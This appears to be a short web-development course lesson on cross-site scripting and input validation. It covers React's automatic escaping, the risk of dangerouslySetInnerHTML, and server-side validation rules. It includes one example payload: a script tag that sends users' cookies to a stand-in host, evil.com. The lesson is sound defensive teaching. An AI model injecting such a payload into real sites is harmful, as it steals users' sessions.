---
title: "Security Basics: XSS and Input Validation"
duration: 8 min
type: listen-along
---

# Security Basics: XSS and Input Validation

We just saw prompt injection. Now let me broaden the picture. This is the first of several security lessons woven throughout the course, and it covers the granddaddy of web security vulnerabilities: XSS.

## What Is XSS?

**XSS** stands for Cross-Site Scripting. It's when an attacker injects malicious code into your website that runs in other users' browsers.

Here's a simple example. Imagine a comment field on your site. A user types:

```html
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

If your app displays that comment without sanitizing it, the script runs in every other user's browser. It could steal their session, redirect them to a phishing page, or worse.

## Why You Should Care

When I was building Dubsado, we were handling sensitive business data — contracts, invoices, client information. An XSS vulnerability could have exposed all of that. It's the kind of thing that destroys trust overnight.

Even if your app seems simple, if you display user-generated content (comments, profiles, messages, form responses), you're vulnerable to XSS.

## How React Protects You

Good news: React (which React Router is built on) automatically escapes content rendered in JSX. If you write:

```tsx
<p>{userComment}</p>
```

React escapes any HTML in `userComment`, so `<script>` tags display as text instead of executing. This is a huge safety net.

**The exception:** `dangerouslySetInnerHTML`. If you use this prop, you're telling React "I know what I'm doing, don't escape this." If the content comes from a user, you're opening yourself up to XSS. The name has "dangerously" in it for a reason.

## Input Validation

The broader principle behind both XSS and prompt injection is **input validation** — never trust data that comes from a user.

### Validate on the Server

Client-side validation (in the browser) is for user experience. Server-side validation is for security. A malicious user can bypass anything that runs in the browser.

Always validate in your server actions and loaders:

```typescript
// Bad: trusting user input
const name = formData.get("name");

// Good: validating user input
const name = formData.get("name");
if (typeof name !== "string" || name.length === 0 || name.length > 100) {
  return { error: "Invalid name" };
}
```

### The Rules

1. **Validate type** — is it a string when you expect a string?
2. **Validate length** — is it within reasonable bounds?
3. **Validate format** — does it match the expected pattern? (email looks like an email, URL looks like a URL)
4. **Sanitize before display** — if you must render HTML, use a sanitization library
5. **Sanitize before storage** — clean it before it goes in the database

## The Mindset

Security isn't a feature you add at the end. It's a lens you apply to everything you build. Every time you accept input from a user, ask yourself: "What's the worst thing someone could put in this field?"

We'll keep building on this foundation. The next major security lesson covers authentication vs. authorization and key management. For now, remember: **never trust user input. Ever.**
